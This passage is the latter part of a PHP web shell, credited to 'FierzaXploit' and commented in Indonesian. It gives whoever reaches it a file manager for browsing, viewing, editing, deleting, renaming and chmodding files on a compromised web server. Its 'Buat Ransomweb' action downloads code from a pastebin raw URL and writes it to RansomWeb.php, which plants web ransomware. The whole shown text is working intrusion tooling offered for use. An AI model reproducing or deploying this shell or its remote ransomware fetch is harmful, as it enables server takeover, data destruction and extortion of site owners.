-9.245,-4.31344 -9.245,-9.245c0,-3.50719 2.02906,-6.58437 4.73,-8.0625c0.14781,-0.06719 0.29563,-0.13437 0.43,-0.215c3.30563,-2.53969 5.45563,-6.90687 6.02,-12.1475c0.29563,-2.71437 0.01344,-5.68406 -0.86,-8.7075c-0.05375,-0.33594 -0.16125,-0.65844 -0.3225,-0.9675c-0.83312,-2.4725 -2.0425,-5.01219 -3.87,-7.4175c-0.67187,-1.14219 -1.92156,-1.80062 -3.23844,-1.69312c-1.33031,0.09406 -2.45906,0.95406 -2.94281,2.19031c-0.47031,1.22281 -0.20156,2.62031 0.69875,3.58781c0.1075,0.14781 0.215,0.28219 0.3225,0.43c-7.67281,-1.78719 -14.59312,-5.84531 -19.8875,-11.395c-0.40312,-0.44344 -0.92719,-0.77937 -1.505,-0.9675c-3.25187,-2.31125 -7.43094,-2.48594 -10.75,-1.1825c-3.655,1.43781 -6.665,4.31344 -9.03,7.6325c-0.02687,0.04031 -0.08062,0.06719 -0.1075,0.1075c-1.80062,2.23063 -4.59562,3.655 -7.525,3.655c-4.93156,0 -9.3525,-4.31344 -9.3525,-9.245c0,-4.93156 4.42094,-9.3525 9.3525,-9.3525c2.17688,0 3.31906,0.41656 4.945,1.505c0.17469,0.12094 0.34938,0.22844 0.5375,0.3225c3.13094,1.38406 6.3425,0.90031 9.46,-0.7525c3.1175,-1.65281 5.92594,-5.68406 4.945,-10.32c-0.05375,-0.215 -0.12094,-0.44344 -0.215,-0.645c-0.25531,-2.15 -0.43,-4.27312 -0.43,-6.235c0,-5.96625 1.42438,-11.54281 3.87,-16.555c0.87344,0.34938 1.84094,0.3225 2.6875,-0.06719c0.86,-0.37625 1.51844,-1.08844 1.8275,-1.97531c0.12094,-0.30906 0.18813,-0.63156 0.215,-0.9675v-0.43c0.37625,-1.78719 0.20156,-3.60125 -0.3225,-5.2675c-0.05375,-0.37625 -0.16125,-0.73906 -0.3225,-1.075c-0.02687,-0.06719 -0.08062,-0.14781 -0.1075,-0.215c-0.06719,-0.1075 -0.13437,-0.215 -0.215,-0.3225c-1.00781,-2.10969 -2.39187,-4.07156 -4.085,-5.9125c-3.68187,-4.00437 -8.43875,-7.4175 -12.9,-9.245c-0.06719,-0.04031 -0.14781,-0.08062 -0.215,-0.1075c-3.7625,-1.24969 -6.235,-4.74344 -6.235,-8.815c0,-4.93156 4.31344,-9.245 9.245,-9.245c4.93156,0 9.3525,4.31344 9.3525,9.245c0,0.80625 -0.26875,1.505 -0.645,3.01c-0.06719,0.28219 -0.1075,0.56438 -0.1075,0.86v0.645h0.1075c-0.73906,4.42094 0.87344,8.89563 3.655,12.5775c0.94063,1.23625 2.05594,2.31125 3.3325,3.225c0.67188,1.1825 1.97531,1.85438 3.3325,1.72c2.21719,0.63156 4.8375,0.48375 7.095,-0.7525c1.57219,-0.86 2.23063,-2.76812 1.505,-4.4075c1.73344,-0.86 3.60125,-1.54531 5.4825,-2.15c0.28219,1.03469 1.02125,1.88125 2.00219,2.31125c0.98094,0.41656 2.10969,0.36281 3.05031,-0.16125c1.90813,-1.02125 3.35938,-2.86219 4.1925,-5.16c0.57781,-0.76594 0.80625,-1.74687 0.645,-2.6875c0.12094,-0.90031 0.17469,-1.81406 0.1075,-2.795c-0.34937,-4.64937 -2.44562,-10.54844 -6.3425,-18.8125c-0.01344,-0.06719 0.01344,-0.26875 0,-0.3225c-0.04031,-0.14781 -0.08062,-0.3225 -0.1075,-0.43c-0.06719,-0.215 -0.13437,-0.38969 -0.215,-0.645c-0.16125,-0.51062 -0.44344,-1.16906 -0.645,-1.8275c-0.40312,-1.33031 -0.645,-3.03687 -0.645,-3.1175c0,-4.93156 4.31344,-9.245 9.245,-9.245zM127.28,20.9625c-7.51156,0 -13.76,6.24844 -13.76,13.76c0,3.27875 -0.51062,4.93156 -0.7525,5.4825c-0.05375,0.1075 0.02688,0.06719 0,0.1075c-0.04031,0.05375 -0.16125,0.16125 -0.1075,0.1075c-1.31687,1.12875 -1.58562,3.06375 -0.63156,4.515c0.95406,1.43781 2.83531,1.94844 4.39406,1.1825c0,0 0.81969,-0.56437 1.29,-1.075c0.47031,-0.51062 1.00781,-1.15562 1.3975,-2.0425c0.77938,-1.76031 1.29,-4.34031 1.29,-8.2775c0,-3.49375 3.38625,-6.88 6.88,-6.88c3.64156,0 6.88,2.91594 6.88,6.88c0,3.49375 -3.38625,6.88 -6.88,6.88c-5.33469,0 -7.6325,4.6225 -7.6325,4.6225c-1.075,1.57219 -0.65844,3.70875 0.91375,4.78375c1.57219,1.075 3.70875,0.65844 4.78375,-0.91375c0,0 1.76031,-1.6125 1.935,-1.6125c7.51156,0 13.76,-6.24844 13.76,-13.76c0,-7.74 -6.39625,-13.76 -13.76,-13.76zM96.32,56.76c-8.50594,0 -15.48,6.97406 -15.48,15.48c0,8.50594 6.97406,15.48 15.48,15.48c8.50594,0 15.48,-6.97406 15.48,-15.48c0,-8.50594 -6.97406,-15.48 -15.48,-15.48zM19.2425,63.3175c-7.00094,0 -13.0075,5.64375 -13.0075,13.0075c0,7.36375 6.00656,13.115 13.0075,13.115c2.63375,0 4.75688,-0.92719 6.3425,-1.72c3.44,-1.72 5.75125,-2.9025 9.03,-2.15c1.23625,0.40313 2.59344,0.09406 3.50719,-0.81969c0.91375,-0.91375 1.24969,-2.27094 0.84656,-3.50719c-0.40312,-1.23625 -1.46469,-2.13656 -2.74125,-2.33813c-5.67062,-1.30344 -10.2125,0.9675 -13.6525,2.6875c-1.16906,0.59125 -2.52625,0.9675 -3.3325,0.9675c-3.31906,0 -6.1275,-2.59344 -6.1275,-6.235c0,-3.64156 2.80844,-6.1275 6.1275,-6.1275c2.08281,0 3.42656,0.72563 4.6225,2.15c0.06719,0.08063 0.13438,0.14781 0.215,0.215c1.84094,1.84094 4.03125,2.74125 6.3425,3.225c2.31125,0.48375 4.68969,0.60469 7.095,-0.43c1.26313,-0.38969 2.19031,-1.49156 2.37844,-2.795c0.18813,-1.31687 -0.40312,-2.62031 -1.505,-3.35937c-1.10187,-0.72563 -2.52625,-0.76594 -3.66844,-0.08063c0,0 -1.41094,0.18813 -2.795,-0.1075c-1.38406,-0.29562 -2.795,-1.075 -3.01,-1.29c-2.2575,-2.58 -5.67062,-4.4075 -9.675,-4.4075zM96.32,63.64c4.78375,0 8.6,3.81625 8.6,8.6c0,4.78375 -3.81625,8.6 -8.6,8.6c-4.78375,0 -8.6,-3.81625 -8.6,-8.6c0,-4.78375 3.81625,-8.6 8.6,-8.6zM70.52,86c-6.61125,0 -12.04,5.42875 -12.04,12.04c0,6.61125 5.42875,12.04 12.04,12.04c6.61125,0 12.04,-5.42875 12.04,-12.04c0,-6.61125 -5.42875,-12.04 -12.04,-12.04zM70.52,92.88c2.88906,0 5.16,2.27094 5.16,5.16c0,2.88906 -2.27094,5.16 -5.16,5.16c-2.88906,0 -5.16,-2.27094 -5.16,-5.16c0,-2.88906 2.27094,-5.16 5.16,-5.16zM100.835,95.9975c-3.41312,0 -6.235,2.71438 -6.235,6.1275c0,3.41313 2.82188,6.235 6.235,6.235c3.41313,0 6.1275,-2.82187 6.1275,-6.235c0,-3.41312 -2.71437,-6.1275 -6.1275,-6.1275zM56.76,121.69c-1.505,0.16125 -2.72781,1.30344 -3.01,2.795c-0.3225,1.41094 -1.15562,2.62031 -2.15,3.5475c-0.99437,0.92719 -2.39187,1.46469 -2.0425,1.3975c-6.74562,0.645 -11.7175,5.93938 -11.7175,12.255c0,7.00094 5.75125,13.115 13.115,13.115c7.22938,0 13.0075,-5.88562 13.0075,-13.115c0,-3.35937 4.1925,-8.17 4.1925,-8.17c1.02125,-0.83312 1.49156,-2.16344 1.19594,-3.45344c-0.29562,-1.27656 -1.30344,-2.28438 -2.58,-2.58c-1.29,-0.29563 -2.62031,0.17469 -3.45344,1.19594c0,0 -6.235,5.34813 -6.235,13.0075c0,3.78938 -2.33812,6.235 -6.1275,6.235c-3.64156,0 -6.235,-2.91594 -6.235,-6.235c0,-3.17125 1.66625,-5.22719 5.6975,-5.4825c0.14781,0.01344 0.28219,0.01344 0.43,0c2.06938,-0.41656 3.61469,-1.46469 5.375,-3.1175c1.76031,-1.65281 3.48031,-4.03125 4.1925,-7.095c0.28219,-1.08844 0.02688,-2.24406 -0.71219,-3.10406c-0.72563,-0.86 -1.8275,-1.30344 -2.94281,-1.19594zM123.84,123.7325c-0.14781,0.02688 -0.29562,0.06719 -0.43,0.1075c-1.59906,0.36281 -2.72781,1.80063 -2.6875,3.44c0,3.17125 1.35719,5.84531 3.1175,7.6325c1.76031,1.78719 3.80281,2.86219 5.4825,3.87c1.67969,1.00781 3.03688,1.935 3.87,2.9025c0.83313,0.9675 1.29,1.94844 1.29,3.87c0,3.31906 -2.48594,5.805 -5.805,5.805c-3.48031,0 -5.9125,-2.01562 -5.9125,-5.805c0,-3.31906 -0.68531,-6.63812 -2.0425,-9.3525c-0.67187,-1.35719 -1.55875,-2.52625 -2.6875,-3.5475c-1.12875,-1.02125 -2.66062,-1.935 -4.515,-1.935c-1.89469,-0.05375 -3.49375,1.43781 -3.5475,3.3325c-0.05375,1.89469 1.43781,3.49375 3.3325,3.5475c0.02688,0.01344 0.02688,0.04031 0.1075,0.1075c0.26875,0.24188 0.67188,0.81969 1.075,1.6125c0.79281,1.58563 1.3975,4.05813 1.3975,6.235c0,7.22938 5.95281,12.685 12.7925,12.685c7.00094,0 12.685,-5.68406 12.685,-12.685c0,-3.39969 -1.26312,-6.38281 -3.01,-8.385c-1.74687,-2.00219 -3.72219,-3.14437 -5.4825,-4.1925c-1.76031,-1.04812 -3.26531,-1.96187 -4.085,-2.795c-0.81969,-0.83312 -1.1825,-1.42437 -1.1825,-2.9025c0.04031,-0.99437 -0.36281,-1.94844 -1.075,-2.62031c-0.72562,-0.68531 -1.70656,-1.02125 -2.6875,-0.92719z"></path></g></g></svg>

                        <a class="path" href="?path=' . $path . '&aksi=buatransom">Buat Ransomweb</a>
                    
                    </div>
                    <!-- akhir auto create ransomweb -->
                </div>
            </div>
        </div>
        <!-- akhir tambah file/folder & ransomweb -->';

        if ($_GET['aksi'] == "buatransom") {
            // Ubah Link ransomnya jika ingin ganti ransomware yangvlain
            $url  = "https://pastebin.com/raw/LbVhNnZF";
            $curl = curl_init($url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            $get    = curl_exec($curl);

            if ($get != "") { // Jika isi file dari url tidak kosong
                // Buat file
                $puts = fopen("RansomWeb.php", "w");
                fwrite($puts, $get);
                fclose($puts);
                $nama_file  = "RansomWeb.php";
                $server_web = 'http://' . $_SERVER["HTTP_HOST"] . '/';
                if ($puts != "") {
                    echo "<script>window.location='?path=" . $path . "'; alert('Sukses')</script>";
                } else {
                    echo "Gagal Membuat File";
                }
            }
        }

        //fungsi buat folder
        if ($_GET['aksi'] == 'buatfolder') {
            if (isset($_POST["folderss"])) {
                $folder = $_POST["namaF"];
                $nama_folder = $path . '/' . $folder;
                system(mkdir($nama_folder));
                echo "<script>window.location='?path=" . $path . "'; alert('Folder Sukses Dibuat!')</script>";
            }

            echo '
            <form method="POST">
                <label for="exampleFormControlInput1" class="label form-label">Nama Folder :</label>
                <div class="tambahdir input-group mb-3">
                    <input name="namaF" type="text" class="form-control" placeholder="Masukkan Nama Folder" aria-describedby="button-addon2">
                    <button name="folderss" class="klik btn btn-outline-secondary" type="submit" id="button-addon2">Create Folder</button>
                </div>  
            </form>';
        }

        //fungsi buat file
        if ($_GET['aksi'] == 'buatfile') {
            if (isset($_POST['buat'])) {

                $nama_file = $path . '/' . $_POST['nama_file'];
                $isi_file = $_POST['isi_file'];

                $buat_file = fopen($nama_file, "w");
                fwrite($buat_file, $isi_file);
                fclose($buat);

                if (empty($buat)) {
                    echo "<script>window.location='?path=" . $path . "'; alert('Sukses!!!')</script>";
                } else {
                    echo "<script>window.location='?path=" . $path . "'; alert('Gagal!!!')</script>";
                }
            }
            echo '<center><h4>{ Buat File }</h4></center>
            <form method="post" class="mt-3">
            <div class="mb-3">
            <label for="exampleFormControlInput1" class="form-label">Nama File :</label>
            <input type="text" name="nama_file" placeholder="Masukkan Nama Filenya" class="form-control" id="exampleFormControlInput1" placeholder="name@example.com">
        </div>
        <div class="mb-3">
<label for="exampleFormControlTextarea1" class="form-label">Isi File :</label>
<textarea class="form-control" name="isi" placeholder="Masukkan Isi Filenya" id="exampleFormControlTextarea1" rows="3"></textarea>
</div><br>
<button name="buat" class="tombol btn btn-outline-secondary" type="submit">Create Now</button>
<br>';
        }

        //openfile
        if (isset($_GET['path_file'])) {
            $lihat = $_GET['path_file'];
        }

        //fungsi liat
        if ($_GET['aksi'] == 'view') {
            echo "<br><div class=\"bgnya container-fluid alert alert-warning alert-dismissible fade show\" role=\"alert\"><textarea class=\"lihat form-control\" id=\"exampleFormControlTextarea1\" rows=\"20\" disabled>" . htmlspecialchars(file_get_contents($lihat)) . "</textarea><a href=\"?Home\" type=\"button\" class=\"tutup btn-close\" data-bs-dismiss=\"alert\" aria-label=\"Close\"></a></div>";
        }

        $scandir = scandir($path); ?>
    <br>
        <div class="tablenya">
        <table width="100%" class="table table-dark table-hover">
            <thead>
                <tr>
                    <th scope="col-">Type</th>
                    <th scope="col">Name</th>
                    <th scope="col">Permission</th>
                    <th scope="col">options</th>
                </tr>
            </thead>
            <tbody>
                <?php
                //menampilkan isi directory
                foreach($scandir as $direktori){
                    if($direktori != "." && $direktori != ".."){
                        if (is_dir($direktori)) {
                            echo "<tr>
                            <th scope=\"row\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"26\" height=\"26\" fill=\"currentColor\" class=\"bi bi-folder-fill\" viewBox=\"0 0 16 16\">
                            <path d=\"M9.828 3h3.982a2 2 0 0 1 1.992 2.181l-.637 7A2 2 0 0 1 13.174 14H2.825a2 2 0 0 1-1.991-1.819l-.637-7a1.99 1.99 0 0 1 .342-1.31L.5 3a2 2 0 0 1 2-2h3.672a2 2 0 0 1 1.414.586l.828.828A2 2 0 0 0 9.828 3zm-8.322.12C1.72 3.042 1.95 3 2.19 3h5.396l-.707-.707A1 1 0 0 0 6.172 2H2.5a1 1 0 0 0-1 .981l.006.139z\"/>
                        </svg></th>
                            <td><a class=\"path\" nama='filenya' href=\"?path=" . $path . "/" . $direktori . "\">" . $direktori . "</a></td>
                            <td>";if(is_writable($path.'/'.$file)) echo '<font color="#2EFF00">';
                            elseif(!is_readable($path.'/'.$file)) echo '<font color="#FF5733">';
                            echo perms($path.'/'.$file);
                            if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>'; echo "</td>
                            <td>
                            <form method='POST' action=\"?option=&path=" . $path . "\">
                            <div class=\"pilihan input-group mb-3\">
                            <select name='opt' class=\"pilihan form-select form-select-sm mb-3\" id=\"inputGroupSelect02\" aria-label=\"Default select example\">
                                <option selected>Choose...</option>
                                <option value=\"rename\">Rename</option>
                                <option value=\"delete\">Delete</option>
                                <option value=\"chmod\">Chmod</option>
                            </select>
                            </div>
                            <input type=\"hidden\" name=\"type\" value=\"directory\">
                            <input type=\"hidden\" name=\"pathnya\" value='" . $path . '/' . $direktori . "'>
                            <button name=\"now\" class=\"tombol btn btn-outline-secondary\" type=\"submit\">Now</button>
                            </form>
                            </td>
                        </tr>";
                        }
                    }
                }

                //Menampilkan isi file
                foreach ($scandir as $file) {
                    if ($file != "." && $file != "..") {
                        if(file_exists($file)){
                            echo "<tr>
                                <th scope=\"row\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"26\" height=\"26\" fill=\"currentColor\" class=\"bi bi-file-earmark-code-fill\" viewBox=\"0 0 16 16\">
                                <path d=\"M9.293 0H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V4.707A1 1 0 0 0 13.707 4L10 .293A1 1 0 0 0 9.293 0zM9.5 3.5v-2l3 3h-2a1 1 0 0 1-1-1zM6.646 7.646a.5.5 0 1 1 .708.708L5.707 10l1.647 1.646a.5.5 0 0 1-.708.708l-2-2a.5.5 0 0 1 0-.708l2-2zm2.708 0 2 2a.5.5 0 0 1 0 .708l-2 2a.5.5 0 0 1-.708-.708L10.293 10 8.646 8.354a.5.5 0 1 1 .708-.708z\"/>
                            </svg></th>
                                <td><a class=\"path\" nama='filenya' href=\"?path=" . $path . "&aksi=view&path_file=" . $path . "/" . $file . "\">" . $file . "</a></td>
                                <td>"; if(is_writable($path.'/'.$file)) echo '<font color="#2EFF00">';
                                elseif(!is_readable($path.'/'.$file)) echo '<font color="#FF5733">';
                                echo perms($path.'/'.$file);
                                if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>'; echo"</td>
                                <td>
                                <form method='POST' action=\"?option=&path=" . $path . "\">
                                <div class=\"pilihan input-group mb-3\">
                                <select name='opt' class=\"pilihan form-select form-select-sm mb-3\" id=\"inputGroupSelect02\" aria-label=\"Default select example\">
                                    <option selected>Choose...</option>
                                    <option value=\"edit\">Edit</option>
                                    <option value=\"rename\">Rename</option>
                                    <option value=\"delete\">Delete</option>
                                    <option value=\"chmod\">Chmod</option>
                                </select>
                                </div>
                                <input type=\"hidden\" name=\"type\" value=\"file\">
                                <input type=\"hidden\" name=\"pathnya\" value='" . $path . '/' . $file . "'>
                                <button name=\"now\" class=\"tombol btn btn-outline-secondary\" type=\"submit\">Now</button>
                                </form>
                                </td>
                            </tr>";
                        }
                    }
                }

                //fungsi ganti permission
                if(isset($_GET['option']) && $_POST['opt'] == "chmod"){
                    if(isset($_POST['perm'])){
                        if(chmod($_POST['path'],$_POST['perm'])){
                            echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
                        }else{
                            echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
                        }
                    }
                        echo '<form method="POST">
                        <div class="row">
                            <div class="col">
                                <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" class="form-control">
                            </div>
                            <input type="hidden" name="path" value="'.$_POST['path'].'">
                            <input type="hidden" name="opt" value="chmod">
                            <div class="col">
                                <input type="submit" value="Go" class="btn btn-outline-primary btn-block">
                            </div>
                        </div>
                    </form>';
                }
        
                //fungsi delete file & folder
                if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
                    if ($_POST['type'] === "directory") {
                        if (rmdir($_GET['pathnya'])) {
                            echo "<script>swal('Berhasil Menghapus Folder!!!', 'Selamat Anda Berhasil Menghapus Folder', 'success')</script>";
                        } else {
                            echo "<script>swal(\"Gagal Menghapus Folder!!!\", \"Maaf Anda Tidak Bisa Menghapus Folder\", \"error\");window.location='?path=" . $path . "'</script>";
                        }
                    } else if ($_POST['type'] == 'file') {
                        if (unlink($_POST['pathnya'])) {
                            echo "<script>swal('Berhasil Menghapus File!!!', 'Selamat Anda Berhasil Menghapus File', 'success'); window.location='?path=" . $path . "';</script>";
                        } else {
                            echo "<script>swal(\"Gagal Menghapus File!!!\", \"Maaf Anda Tidak Bisa Menghapus File\", \"error\"); window.location='?path=" . $path . "';</script>";
                        }
                    }
                }

                //fungsi edit file
                if ($_POST['opt'] == 'edit') {
                    if (isset($_POST['src'])) {
                        $fp = fopen($_POST['path'], 'w');
                        if (fwrite($fp, $_POST['src'])) {
                            echo "<script>window.location='?path=" . $path . "';swal('Berhasil Mengedit File!!!', 'Selamat Anda Berhasil Mengedit File', 'success');</script>";
                        } else {
                            echo "<script>window.location='?path=" . $path . "'; swal('Gagal Menghapus File!!!', 'Anda Gagal Menghapus File', 'error');</script>";
                        }
                        fclose($fp);
                    }
                    echo "<form method='POST'><div class=\"bgnya container-fluid alert alert-warning alert-dismissible fade show\" role=\"alert\">
                <textarea class=\"lihat form-control\" id=\"exampleFormControlTextarea1\" rows=\"20\" name=\"src\">" . htmlspecialchars(file_get_contents($_POST['pathnya'])) . "</textarea><a href=\"?Home\" type=\"button\" class=\"tutup btn-close\" data-bs-dismiss=\"alert\" aria-label=\"Close\"></a>
                <input type=\"hidden\" name=\"path\" value='" . $_POST["pathnya"] . "'>
    <input type=\"hidden\" name=\"opt\" value=\"edit\">
                </div><button name=\"edit\" class=\"tombol btn btn-outline-secondary\" type=\"submit\">Simpan</button></form>";
                }

                //fungsi rename file & folder
                if ($_POST['opt'] == 'rename') {
                    if (isset($_POST['newname'])) {
                        if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                            echo "<script>window.location='?path=" . $path . "'; swal('Berhasil Merename File!!!', 'Selamat Anda Berhasil Merename File', 'success');</script>";
                        } else {
                            echo "<script>window.location='?path=" . $path . "'; swal('Gagal Merename File!!!', 'Anda Gagal Merenames File', 'error');</script>";
                        }
                        $_POST['name'] = $_POST['newname'];
                    }
                    echo '<form method="POST">
                        <div class="container-fluid>
                        <div class="mb-3">
                        <label for="exampleFormControlInput1" class="form-label">Name File/Directory</label>
                        <input name="newname" type="text" class="form-control" id="exampleFormControlInput1" value="' . $_POST['name'] . '" placeholder="New Name">
                    </div>
                    <input type="hidden" name="path" value="' . $_POST['pathnya'] . '">
                    <input type="hidden" name="name" value="' . $lihat . '">
                    <input type="hidden" name="opt" value="rename">
                    <br><br>
                    <input type="submit" value="Rename Now" class="tombol btn btn-outline-secondary btn-block">
                    </div>
                    </form>';
                }
                ?>
            </tbody>
        </table>
        </div>
    </div>
    <!-- akhir list file/folder -->

    <br><br><br>
    <div class="footer">
        <center>
            <?php echo "<p class=\"info\">Design & Developed By FierzaXploit <br> Copyright &copy; "; echo date('Y')."</p>";?>
        </center>
    </div>
        </div>
    </div>
    <br>

    <!-- Optional JavaScript; choose one of the two! -->

    <!-- Option 1: Bootstrap Bundle with Popper -->
    <!-- JavaScript Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous">
    </script>

    <!-- Option 2: Separate Popper and Bootstrap JS -->
    <!--
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.min.js" integrity="sha384-Atwg2Pkwv9vp0ygtn1JAojH0nYbwNJLPhwyoVbhoPwBhjQPR5VtM2+xf0Uwh9KtT" crossorigin="anonymous"></script>
    -->
</body>

</html>
